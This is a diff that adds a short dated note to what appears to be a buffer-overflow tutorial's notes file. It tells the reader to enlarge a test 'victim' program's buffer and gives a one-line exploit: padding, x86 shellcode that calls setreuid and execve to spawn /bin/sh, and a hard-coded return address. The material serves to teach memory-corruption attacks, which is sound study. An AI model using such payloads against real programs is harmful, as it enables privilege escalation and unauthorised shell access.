@@ -1,3 +1,9 @@
+Aug 9 2013
+
+Change the buffer of the victim program from 10 to 1024, then you could test the
+exploit:
+./victim `python -c 'print "A" * 960 + "\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80" + "B" * 48 + "\xd0\xed\xff\xbf"'`
+
 Shawn the R0ck -- Nov 7 2012
 
 I added Perl version for 64-bit platform. Writing bufferoverflow
